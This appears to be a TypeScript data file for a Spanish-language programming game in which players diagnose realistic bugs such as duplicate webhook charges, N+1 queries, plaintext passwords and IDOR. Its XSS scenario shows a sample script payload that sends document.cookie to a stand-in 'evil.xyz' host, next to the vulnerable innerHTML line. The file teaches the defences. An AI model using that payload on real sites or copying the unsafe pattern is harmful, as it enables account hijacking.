// Bugs de CodeStudio v2 como mini-juego de diagnóstico: cada escenario es
// un bug real de la industria con síntomas, evidencia (logs/código) y
// opciones. Elegir bien lo arregla barato, da XP y enseña el porqué;
// elegir mal cuesta caja/satisfacción y explica por qué esa opción no era.
// Las opciones correctas NUNCA viajan al cliente antes de responder (ver
// publicBug en codestudio.service.ts).

import { CodeStudioBugSeverity } from '@prisma/client';

export type BugTrigger = 'release' | 'load' | 'stability' | 'security' | 'event';

export type BugOption = { key: string; label: string; correct: boolean; feedback: string };

export type BugScenario = {
  key: string;
  title: string;
  trigger: BugTrigger;
  severity: CodeStudioBugSeverity;
  // release: solo aparece al publicar alguna de estas features.
  forFeatures?: string[];
  // Solo puede aparecer si la empresa tiene TODAS estas features.
  requiresFeatures?: string[];
  // Si la empresa tiene alguna de estas, el bug no aparece: el árbol protege.
  preventedBy?: string[];
  symptom: string;
  evidence: string[];
  options: BugOption[];
  lesson: string;
  // Qué construir para que no vuelva (se muestra después de resolverlo).
  preventHint?: string;
};

export const BUG_SCENARIOS: BugScenario[] = [
  {
    key: 'duplicate-charge',
    title: 'Cobros duplicados',
    trigger: 'release',
    severity: 'HIGH',
    forFeatures: ['payments', 'subscriptions'],
    symptom: 'Varios clientes escriben furiosos: les cobraron DOS veces la misma compra.',
    evidence: [
      'POST /webhooks/payments 200  evt_8f2 (payment.succeeded)',
      'POST /webhooks/payments 200  evt_8f2 (payment.succeeded)   ← reintento del proveedor',
      'INSERT INTO orders (user_id, amount) VALUES (42, 9.99)   -- ejecutado 2 veces',
    ],
    options: [
      { key: 'more-servers', label: 'Agregar más servidores para que el webhook responda más rápido', correct: false, feedback: 'Más servidores no cambian la lógica: el mismo evento seguiría procesándose dos veces cada vez que el proveedor reintente.' },
      { key: 'idempotency', label: 'Guardar el id de cada evento y descartar los que ya procesaste', correct: true, feedback: '¡Exacto! Los proveedores de pago reintentan los webhooks si no reciben respuesta a tiempo. Procesar cada evento una sola vez usando su id hace que el cobro sea idempotente.' },
      { key: 'disable-retries', label: 'Pedirle al proveedor de pagos que desactive los reintentos', correct: false, feedback: 'Los reintentos existen a propósito: si tu servidor se cae, así no pierdes pagos. No puedes (ni deberías) apagarlos.' },
      { key: 'manual-review', label: 'Apagar los webhooks y revisar cada pago a mano', correct: false, feedback: 'Arregla el síntoma hoy, pero con 1.000 pagos diarios nadie puede revisarlos a mano y terminarías perdiendo pagos reales.' },
    ],
    lesson: 'Toda operación que mueve dinero debe ser idempotente: ejecutarla dos veces tiene que dar el mismo resultado que ejecutarla una.',
  },
  {
    key: 'session-logout',
    title: 'Todos quedan deslogueados',
    trigger: 'release',
    severity: 'MEDIUM',
    forFeatures: ['auth', 'profiles'],
    symptom: 'Cada vez que publicas una actualización, TODOS los usuarios tienen que volver a iniciar sesión.',
    evidence: [
      'const sessions = new Map(); // sesiones guardadas en la memoria del proceso',
      'Deploy v1.4 → proceso reiniciado',
      'GET /me 401 Unauthorized (x 312)',
    ],
    options: [
      { key: 'longer-session', label: 'Hacer que la sesión dure 1 año', correct: false, feedback: 'La duración no importa: la memoria del proceso se borra entera al reiniciar, dure lo que dure la sesión.' },
      { key: 'no-deploys', label: 'Publicar actualizaciones solo de madrugada', correct: false, feedback: 'Molestas a menos gente, pero el bug sigue ahí. Y no poder desplegar cuando quieras te frena todo el equipo.' },
      { key: 'shared-store', label: 'Guardar las sesiones fuera del proceso (Redis/base de datos) o usar tokens firmados (JWT)', correct: true, feedback: '¡Bien! Lo que está en la memoria de un proceso desaparece cuando se reinicia. Las sesiones deben vivir en un almacén compartido o en un token que el servidor pueda verificar.' },
      { key: 'remember-me', label: 'Pedir a los usuarios que marquen "Recordarme"', correct: false, feedback: 'La cookie de "recordarme" apunta a una sesión que ya no existe en la memoria. Seguirían deslogueados.' },
    ],
    lesson: 'El estado en memoria de un proceso muere con el proceso. Lo que tiene que sobrevivir a un reinicio va afuera: base de datos, Redis o un token firmado.',
  },
  {
    key: 'n-plus-one',
    title: 'La pantalla principal tarda 6 segundos',
    trigger: 'release',
    severity: 'MEDIUM',
    forFeatures: ['core-feature', 'community', 'search'],
    symptom: 'Con apenas unos cientos de usuarios, la pantalla principal tarda 6 segundos en cargar.',
    evidence: [
      'SELECT * FROM posts ORDER BY created_at DESC LIMIT 20;',
      'SELECT * FROM users WHERE id = 1;',
      'SELECT * FROM users WHERE id = 2;',
      '… 18 consultas más, una por cada post',
    ],
    options: [
      { key: 'bigger-server', label: 'Comprar un servidor más grande', correct: false, feedback: 'Harías 21 consultas un poco más rápido, pero siguen siendo 21 viajes a la base de datos. Con 100 posts serían 101.' },
      { key: 'fewer-posts', label: 'Mostrar solo 5 posts', correct: false, feedback: 'Reduce el daño, pero el patrón sigue: el día que muestres más, vuelve el problema. Además empeoras el producto.' },
      { key: 'cache-all', label: 'Poner caché a todas las consultas', correct: false, feedback: 'Tapas el problema y agregas otro: datos viejos en pantalla. Primero hay que dejar de hacer consultas de más.' },
      { key: 'join', label: 'Traer los autores en una sola consulta (JOIN o WHERE id IN (...))', correct: true, feedback: '¡Correcto! Es el clásico problema N+1: 1 consulta para la lista y N más, una por elemento. Traer todo junto lo convierte en 1 o 2 consultas.' },
    ],
    lesson: 'Problema N+1: una consulta por la lista y otra por cada elemento. Se detecta mirando los logs de SQL y se arregla trayendo los datos relacionados de una vez.',
  },
  {
    key: 'xss-comments',
    title: 'Perfiles que roban cuentas',
    trigger: 'release',
    severity: 'HIGH',
    forFeatures: ['profiles', 'community'],
    symptom: 'Usuarios reportan que al abrir ciertos perfiles "pasa algo raro" y después perdieron su cuenta.',
    evidence: [
      'bio: "<script>fetch(\'https://evil.xyz?c=\' + document.cookie)</script>"',
      'profileCard.innerHTML = user.bio;',
    ],
    options: [
      { key: 'ban-word', label: 'Prohibir la palabra "script" en la biografía', correct: false, feedback: 'Hay cientos de formas de inyectar JavaScript sin esa palabra, por ejemplo <img src=x onerror=...>. Las listas negras siempre se saltan.' },
      { key: 'escape', label: 'Mostrar el contenido del usuario como texto (escapar/sanitizar HTML)', correct: true, feedback: '¡Exacto! Es XSS (Cross-Site Scripting). Nunca insertes contenido del usuario como HTML: usa textContent o un sanitizador, y así el navegador lo trata como texto.' },
      { key: 'delete-profile', label: 'Borrar el perfil del atacante', correct: false, feedback: 'El agujero sigue abierto: el próximo atacante hace lo mismo con otra cuenta.' },
      { key: 'warn-users', label: 'Avisar a los usuarios que no abran perfiles raros', correct: false, feedback: 'Los usuarios no pueden saber qué perfil es malicioso. La seguridad es tu responsabilidad, no la de ellos.' },
    ],
    lesson: 'XSS: todo lo que escribe un usuario es entrada no confiable. Se muestra escapado, nunca como HTML.',
  },
  {
    key: 'timezone-expiry',
    title: 'Premium vence un día antes',
    trigger: 'release',
    severity: 'MEDIUM',
    forFeatures: ['subscriptions', 'annual-plans', 'free-trial'],
    symptom: 'Usuarios de Colombia dicen que su Premium venció un día antes de lo que pagaron.',
    evidence: [
      "expires_at = '2026-10-01 00:00'   -- sin zona horaria",
      'Servidor en UTC · usuario en UTC-5',
      '30 sep 19:00 (Bogotá) = 1 oct 00:00 (UTC) → "vencido"',
    ],
    options: [
      { key: 'plus-one', label: 'Sumar un día extra a todas las suscripciones', correct: false, feedback: 'Regalas un día a usuarios de otras zonas y el bug sigue ahí para el siguiente cálculo de fechas.' },
      { key: 'utc', label: 'Guardar todas las fechas en UTC y convertir a la zona del usuario solo al mostrarlas', correct: true, feedback: '¡Bien! Guardar en UTC y convertir solo en la pantalla es la regla de oro de las fechas. Así cada usuario ve su hora local correcta.' },
      { key: 'server-tz', label: 'Poner el servidor en hora de Colombia', correct: false, feedback: 'Se arregla para Colombia y se rompe para México, España y cualquier otro país. Y los cambios de horario lo empeoran.' },
      { key: 'ignore', label: 'No es grave, es solo un día', correct: false, feedback: 'Cobrar por un servicio y no darlo completo genera reembolsos, reseñas de 1 estrella y hasta problemas legales.' },
    ],
    lesson: 'Fechas: guarda siempre en UTC, convierte a la zona del usuario solo al mostrar.',
  },
  {
    key: 'emails-spam',
    title: 'Los emails no llegan',
    trigger: 'release',
    severity: 'LOW',
    forFeatures: ['email-notifications', 'referrals'],
    symptom: 'Los usuarios no reciben el email de bienvenida ni el de recuperar contraseña.',
    evidence: ['Gmail: "No pudimos verificar que este mensaje lo envió codebuddies.app" → Spam', 'SPF: none · DKIM: none · DMARC: none'],
    options: [
      { key: 'send-3', label: 'Enviar cada email 3 veces para asegurar', correct: false, feedback: 'Así te marcan como spammer todavía más rápido y dañas la reputación de tu dominio.' },
      { key: 'gmail', label: 'Enviarlos desde un Gmail personal', correct: false, feedback: 'Gmail personal tiene límites diarios bajos y tu marca no aparece. No escala.' },
      { key: 'dns', label: 'Configurar SPF, DKIM y DMARC en el DNS de tu dominio', correct: true, feedback: '¡Correcto! Estos registros prueban que tus emails realmente salen de tu dominio. Sin ellos, Gmail y Outlook los mandan a spam.' },
      { key: 'check-spam', label: 'Pedir a los usuarios que revisen su carpeta de spam', correct: false, feedback: 'La mayoría nunca lo hará, y el email de recuperar contraseña es crítico.' },
    ],
    lesson: 'Entregabilidad de email: sin SPF, DKIM y DMARC, tus correos no existen.',
  },
  {
    key: 'stale-cache',
    title: 'Datos viejos en pantalla',
    trigger: 'release',
    severity: 'MEDIUM',
    forFeatures: ['cache', 'personalization'],
    symptom: 'Los usuarios cambian su foto o su nombre pero siguen viendo el dato viejo durante horas.',
    evidence: ["cache.set('user:42', data, { ttl: 86400 })   // 24 horas", 'UPDATE users SET avatar = ... WHERE id = 42   -- la caché no se toca'],
    options: [
      { key: 'remove-cache', label: 'Quitar la caché', correct: false, feedback: 'Vuelve la lentitud que la caché resolvía. El problema no es tener caché, es no invalidarla.' },
      { key: 'ttl-1s', label: 'Bajar la duración de la caché a 1 segundo', correct: false, feedback: 'Casi no cachearías nada: pierdes todo el beneficio de rendimiento.' },
      { key: 'invalidate', label: 'Borrar o actualizar la entrada de caché cuando cambian los datos', correct: true, feedback: '¡Exacto! Eso se llama invalidación: cuando el dato cambia en la base, también se limpia en la caché.' },
      { key: 'browser', label: 'Pedir a los usuarios que limpien el caché del navegador', correct: false, feedback: 'La caché problemática está en tu servidor (Redis), no en el navegador del usuario.' },
    ],
    lesson: 'Cachear es fácil; lo difícil es invalidar. Cada vez que un dato cambia, su caché tiene que enterarse.',
  },
  {
    key: 'race-stock',
    title: 'Se vendió más de lo que había',
    trigger: 'release',
    severity: 'HIGH',
    forFeatures: ['payments', 'teams-plan'],
    symptom: 'Se vendieron 15 cupos de una promoción que solo tenía 10.',
    evidence: ['req A: SELECT stock → 1', 'req B: SELECT stock → 1', 'req A: UPDATE stock = 0 → vendido', 'req B: UPDATE stock = 0 → vendido otra vez'],
    options: [
      { key: 'check-twice', label: 'Revisar el stock dos veces antes de vender', correct: false, feedback: 'Sigue habiendo un momento entre leer y escribir en el que otra petición se cuela. Es una condición de carrera.' },
      { key: 'atomic', label: 'Verificar y descontar en una sola operación atómica (UPDATE … WHERE stock > 0 o una transacción con bloqueo)', correct: true, feedback: '¡Bien! Si la verificación y el descuento ocurren en la misma operación atómica, dos compras simultáneas no pueden llevarse el mismo cupo.' },
      { key: 'sleep', label: 'Agregar una pausa aleatoria antes de vender', correct: false, feedback: 'Solo hace el bug más difícil de reproducir, no lo elimina. Y vuelve lenta tu app.' },
      { key: 'manual', label: 'Cancelar a mano las ventas sobrantes', correct: false, feedback: 'Pierdes la confianza de los clientes que ya pagaron, y va a volver a pasar en la próxima promoción.' },
    ],
    lesson: 'Condición de carrera: dos peticiones leen el mismo dato a la vez. Leer-y-escribir debe ser una sola operación atómica.',
  },
  {
    key: 'image-weight',
    title: 'La app consume muchísimos datos',
    trigger: 'release',
    severity: 'LOW',
    forFeatures: ['profiles', 'mobile-app', 'community'],
    preventedBy: ['cdn'],
    symptom: 'Usuarios en 4G dicen que la app es lenta y se come sus datos móviles.',
    evidence: ['avatar.png — 6,4 MB (4000×4000 px)', 'se muestra en pantalla a 48×48 px'],
    options: [
      { key: 'ask-users', label: 'Pedir a los usuarios que suban fotos más livianas', correct: false, feedback: 'Nadie lo hará, y no deberían tener que hacerlo.' },
      { key: 'resize', label: 'Redimensionar y comprimir las imágenes al subirlas, y servirlas por CDN', correct: true, feedback: '¡Correcto! Una imagen de 48 px no necesita 4000 px. Procesarlas al subirlas ahorra datos, tiempo y servidor.' },
      { key: 'remove-photos', label: 'Quitar las fotos de perfil', correct: false, feedback: 'Empeoras el producto para arreglar un problema técnico que tiene solución.' },
      { key: 'lazy-js', label: 'Cargar las imágenes con JavaScript', correct: false, feedback: 'Siguen pesando 6 MB cada una; solo cambias el momento en que se descargan.' },
    ],
    lesson: 'Rendimiento web: sirve cada imagen al tamaño en que se muestra. Casi siempre es lo que más pesa.',
    preventHint: 'Construye "CDN para archivos" en la rama Rendimiento.',
  },
  {
    key: 'slow-query-index',
    title: 'Base de datos al 100%',
    trigger: 'load',
    severity: 'HIGH',
    preventedBy: ['db-indexes'],
    symptom: 'Buscar pedidos tarda 4 segundos y la base de datos está al 100% de CPU.',
    evidence: ['EXPLAIN SELECT * FROM orders WHERE user_id = 42;', 'Seq Scan on orders  (rows=1.200.000)  time=3.900 ms'],
    options: [
      { key: 'restart-db', label: 'Reiniciar la base de datos', correct: false, feedback: 'Libera la CPU un minuto, pero la siguiente consulta vuelve a recorrer 1,2 millones de filas.' },
      { key: 'index', label: 'Crear un índice en orders.user_id', correct: true, feedback: '¡Exacto! "Seq Scan" significa que la base lee TODA la tabla. Con un índice salta directo a las filas de ese usuario: de segundos a milisegundos.' },
      { key: 'delete-old', label: 'Borrar los pedidos viejos', correct: false, feedback: 'Pierdes datos de tus clientes y el problema vuelve en cuanto crezcas.' },
      { key: 'mongo', label: 'Migrar todo a MongoDB', correct: false, feedback: 'Reescribir todo no arregla una consulta sin índice. MongoDB también necesita índices.' },
    ],
    lesson: 'EXPLAIN te dice cómo la base ejecuta una consulta. "Seq Scan" en una tabla grande casi siempre = falta un índice.',
    preventHint: 'Construye "Índices en la base de datos" en la rama Rendimiento.',
  },
  {
    key: 'connection-exhaustion',
    title: 'Error 500 en horas pico',
    trigger: 'load',
    severity: 'HIGH',
    preventedBy: ['connection-pool'],
    symptom: 'En las horas pico la mitad de los usuarios ve "Error 500".',
    evidence: ['FATAL: sorry, too many clients already', 'max_connections = 100 · conexiones abiertas: 100/100', 'cada petición abre una conexión nueva y la cierra al final'],
    options: [
      { key: 'max-conn', label: 'Subir max_connections a 10.000', correct: false, feedback: 'Cada conexión consume memoria de la base de datos. Con 10.000 se queda sin RAM y se cae entera.' },
      { key: 'pool', label: 'Usar un pool de conexiones que las reutilice', correct: true, feedback: '¡Correcto! Un pool mantiene unas pocas conexiones abiertas y las presta a cada petición. Abrir conexiones es caro; reutilizarlas no.' },
      { key: 'try-later', label: 'Mostrar "Inténtalo más tarde"', correct: false, feedback: 'Pierdes usuarios justo en tu mejor momento de tráfico.' },
      { key: 'per-query', label: 'Abrir y cerrar una conexión por cada consulta', correct: false, feedback: 'Eso es justamente lo que causa el problema: todavía más conexiones abiertas y cerradas.' },
    ],
    lesson: 'Las bases de datos aceptan pocas conexiones simultáneas. Un pool las reutiliza.',
    preventHint: 'Construye "Pool de conexiones" en la rama Rendimiento.',
  },
  {
    key: 'server-overload',
    title: 'Servidores saturados',
    trigger: 'load',
    severity: 'HIGH',
    symptom: 'La app va lentísima: los servidores están al 100% y la gente se queja en redes.',
    evidence: ['CPU: 100% · memoria: 94%', 'p95 latencia: 2.800 ms (normal: 150 ms)', 'carga actual > capacidad de tu infraestructura'],
    options: [
      { key: 'limit-users', label: 'Cerrar los registros hasta que baje el tráfico', correct: false, feedback: 'Frenas tu propio crecimiento. El tráfico era lo que querías: hay que aguantarlo.' },
      { key: 'kill-monitoring', label: 'Apagar el monitoreo para liberar CPU', correct: false, feedback: 'El monitoreo usa ~1% de CPU. Lo apagas y te quedas a ciegas en plena crisis.' },
      { key: 'scale', label: 'Escalar: mejorar o agregar servidores y cachear lo que más se repite', correct: true, feedback: '¡Bien! Cuando la carga supera la capacidad, hay que agregar capacidad (Infraestructura) o reducir la carga (caché, colas). OJO: si no amplías la capacidad, este bug volverá.' },
      { key: 'wait', label: 'Esperar a que pase el pico', correct: false, feedback: 'Mientras esperas, los usuarios se van a la competencia y dejan reseñas malas.' },
    ],
    lesson: 'Escalar es aumentar capacidad (más/mejores servidores) o bajar la carga por usuario (caché, colas, CDN).',
    preventHint: 'Mejora tu Infraestructura y construye Caché, CDN y Cola de trabajos.',
  },
  {
    key: 'memory-leak',
    title: 'El servidor se reinicia solo',
    trigger: 'stability',
    severity: 'HIGH',
    symptom: 'Cada pocas horas el servidor se cae y se reinicia. Antes de caer se pone cada vez más lento.',
    evidence: ['RAM: 300 MB → 900 MB → 1,9 GB → OOMKilled', 'const cache = {};  // se agrega una entrada por request… y nunca se borra'],
    options: [
      { key: 'cron-restart', label: 'Programar un reinicio automático cada hora', correct: false, feedback: 'Es un parche: la fuga sigue. Cuando tengas más tráfico, el servidor caerá cada 10 minutos.' },
      { key: 'more-ram', label: 'Duplicar la RAM del servidor', correct: false, feedback: 'Solo tardará el doble en llenarse. Una fuga de memoria crece sin límite.' },
      { key: 'fix-leak', label: 'Ponerle un límite a esa caché (tamaño máximo o expiración)', correct: true, feedback: '¡Exacto! Es una fuga de memoria: algo que crece para siempre. Un límite de tamaño o tiempo (LRU/TTL) la cierra.' },
      { key: 'rewrite', label: 'Reescribir el backend en otro lenguaje', correct: false, feedback: 'Cualquier lenguaje tiene fugas si guardas cosas para siempre. Meses de trabajo para no arreglar nada.' },
    ],
    lesson: 'Fuga de memoria: si la RAM sube y nunca baja, algo se guarda para siempre. Busca colecciones sin límite.',
    preventHint: 'La deuda técnica alta causa estos bugs: contrata QA y construye Tests automatizados.',
  },
  {
    key: 'bad-deploy',
    title: 'Pantalla en blanco tras el deploy',
    trigger: 'stability',
    severity: 'CRITICAL',
    preventedBy: ['ci-cd'],
    symptom: 'Acabas de publicar y la app muestra una pantalla en blanco a TODOS los usuarios.',
    evidence: ['Deploy v2.3.0 — hace 2 minutos', "TypeError: Cannot read properties of undefined (reading 'price')", 'Errores: 0/min → 1.240/min'],
    options: [
      { key: 'hotfix-prod', label: 'Arreglar el código directamente en el servidor de producción', correct: false, feedback: 'Bajo presión y sin probar se cometen más errores. Cada minuto caído pierdes usuarios.' },
      { key: 'restart', label: 'Reiniciar los servidores', correct: false, feedback: 'El código roto sigue ahí: reinicia y vuelve a fallar igual.' },
      { key: 'rollback', label: 'Hacer rollback a la versión anterior y arreglar con calma', correct: true, feedback: '¡Correcto! Primero se restaura el servicio (rollback), después se investiga. Con CI/CD y tests, este deploy nunca habría llegado a producción.' },
      { key: 'wait', label: 'Esperar a ver si se arregla solo', correct: false, feedback: 'Los bugs no se arreglan solos. Cada minuto de caída es dinero y reputación.' },
    ],
    lesson: 'En un incidente: primero restaurar (rollback), después investigar. Los tests en CI evitan que el código roto llegue a producción.',
    preventHint: 'Construye "CI/CD" en la rama Calidad.',
  },
  {
    key: 'plaintext-passwords',
    title: 'Contraseñas filtradas',
    trigger: 'security',
    severity: 'CRITICAL',
    requiresFeatures: ['auth'],
    preventedBy: ['password-hashing'],
    symptom: 'Un investigador de seguridad te avisa: encontró tu base de datos filtrada y las contraseñas se leen tal cual.',
    evidence: ['SELECT email, password FROM users LIMIT 2;', 'ana@mail.com  | ana1234', 'leo@mail.com  | futbol2024'],
    options: [
      { key: 'base64', label: 'Guardarlas codificadas en Base64', correct: false, feedback: 'Base64 no es seguridad: cualquiera lo decodifica en un segundo.' },
      { key: 'hash', label: 'Guardar solo un hash con bcrypt/argon2, forzar cambio de contraseña y avisar a los usuarios', correct: true, feedback: '¡Exacto! Las contraseñas no se cifran, se hashean con un algoritmo lento y con sal. Y ante una filtración, se avisa y se fuerza el cambio.' },
      { key: 'aes', label: 'Cifrarlas con AES y guardar la clave en el servidor', correct: false, feedback: 'Si roban el servidor, roban también la clave. Las contraseñas se hashean, no se cifran de forma reversible.' },
      { key: 'hide', label: 'Pedir que borren la filtración y no decir nada', correct: false, feedback: 'No puedes borrar internet, y ocultar una filtración es ilegal en muchos países. La confianza se pierde para siempre.' },
    ],
    lesson: 'Contraseñas: nunca en texto plano. Hash lento con sal (bcrypt, argon2). Ante una filtración: avisar y forzar el cambio.',
    preventHint: 'Construye "Contraseñas cifradas" en la rama Seguridad.',
  },
  {
    key: 'bots-signup',
    title: 'Ataque de bots',
    trigger: 'security',
    severity: 'HIGH',
    requiresFeatures: ['auth'],
    preventedBy: ['rate-limiting'],
    symptom: 'En una hora se registraron 8.000 cuentas nuevas… todas desde las mismas 3 IPs.',
    evidence: ['POST /signup 201 — 185.23.x.x  (x 2.900)', 'emails: user8812@tempmail.xyz, user8813@tempmail.xyz, …'],
    options: [
      { key: 'block-ips', label: 'Bloquear esas 3 IPs', correct: false, feedback: 'Los atacantes cambian de IP en segundos. Es jugar al gato y al ratón para siempre.' },
      { key: 'rate-limit', label: 'Limitar registros por IP (rate limiting) y agregar captcha', correct: true, feedback: '¡Correcto! Un límite de peticiones por IP y un captcha frenan a los scripts sin molestar a las personas reales.' },
      { key: 'close-signup', label: 'Desactivar los registros', correct: false, feedback: 'Bloqueas también a todos tus usuarios reales. El ataque gana.' },
      { key: 'ignore', label: 'Ignorarlo: son más usuarios', correct: false, feedback: 'Usuarios falsos inflan tus métricas, te cuestan servidores y abusan de tus promociones.' },
    ],
    lesson: 'Todo endpoint público necesita límites: sin rate limiting, un script hace en minutos lo que 1.000 personas en un mes.',
    preventHint: 'Construye "Rate limiting y captcha" en la rama Seguridad.',
  },
  {
    key: 'exposed-api',
    title: 'Una API expone datos de todos',
    trigger: 'event',
    severity: 'CRITICAL',
    symptom: 'Cambiando el número en /api/users/42 por /api/users/43 se ven los datos de otro usuario.',
    evidence: ['GET /api/users/43  200 OK  (sesión del usuario 42)', 'app.get("/api/users/:id", (req, res) => res.json(db.users.find(req.params.id)))'],
    options: [
      { key: 'hide-button', label: 'Quitar el botón del frontend que llama a esa API', correct: false, feedback: 'El atacante no usa tu frontend: llama a la API directamente. La seguridad nunca vive en el frontend.' },
      { key: 'check-owner', label: 'Verificar en el backend que el usuario de la sesión tenga permiso sobre ese recurso', correct: true, feedback: '¡Exacto! Es un IDOR (control de acceso roto). Cada endpoint debe comprobar que quien pide el dato tiene permiso para verlo.' },
      { key: 'random-url', label: 'Cambiar los ids por números difíciles de adivinar', correct: false, feedback: 'Es seguridad por oscuridad: tarde o temprano alguien los encuentra. Sin verificación de permisos, sigue abierto.' },
      { key: 'terms', label: 'Agregar en los términos que está prohibido', correct: false, feedback: 'Un atacante no lee tus términos. Necesitas una barrera técnica.' },
    ],
    lesson: 'Control de acceso roto (IDOR): el backend debe verificar permisos en CADA petición, no confiar en lo que el frontend muestra.',
  },
];

export const BUG_SCENARIO_BY_KEY = new Map(BUG_SCENARIOS.map((scenario) => [scenario.key, scenario]));

export const BUG_SEVERITY_WEIGHT: Record<CodeStudioBugSeverity, number> = { LOW: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 5 };

// Costo de "contratar una consultora" (arreglo con caja, sin aprender nada).
// Escala con la etapa para que siga doliendo cuando la empresa es grande.
const CONSULTANT_BASE: Record<CodeStudioBugSeverity, number> = { LOW: 200, MEDIUM: 450, HIGH: 900, CRITICAL: 1600 };

export function consultantFixCost(severity: CodeStudioBugSeverity, stage: number) {
  return Math.round(CONSULTANT_BASE[severity] * (1 + stage * 0.6));
}

// Diagnosticar bien = solo el tiempo del equipo (15% de la consultora).
export const DIAGNOSE_COST_FACTOR = 0.15;
// Diagnosticar mal = tiempo perdido (25%) + usuarios molestos.
export const WRONG_DIAGNOSIS_COST_FACTOR = 0.25;
export const WRONG_DIAGNOSIS_SATISFACTION = -3;
// Asignar a un empleado técnico: gratis en caja, pero tarda y lo saca del
// desarrollo mientras tanto.
export const EMPLOYEE_FIX_SECONDS_PER_WEIGHT = 40;

export const MAX_OPEN_BUGS = 4;

type SpawnContext = { installed: Set<string>; openKeys: Set<string> };

function available(scenario: BugScenario, ctx: SpawnContext) {
  if (ctx.openKeys.has(scenario.key)) return false;
  if (scenario.preventedBy?.some((slug) => ctx.installed.has(slug))) return false;
  if (scenario.requiresFeatures?.some((slug) => !ctx.installed.has(slug))) return false;
  return true;
}

// rng inyectable para tests.
export function pickScenario(trigger: BugTrigger, ctx: SpawnContext, rng: () => number, releasedSlug?: string) {
  let candidates = BUG_SCENARIOS.filter((scenario) => scenario.trigger === trigger && available(scenario, ctx));
  if (trigger === 'release') {
    candidates = candidates.filter((scenario) => releasedSlug && scenario.forFeatures?.includes(releasedSlug));
  }
  if (candidates.length === 0) return null;
  // Para carga: los bugs "específicos" (índices, pool) primero; el genérico
  // de saturación solo si ya construiste las protecciones específicas.
  if (trigger === 'load') {
    const specific = candidates.filter((scenario) => scenario.key !== 'server-overload');
    if (specific.length > 0) candidates = specific;
  }
  return candidates[Math.floor(rng() * candidates.length)] ?? null;
}
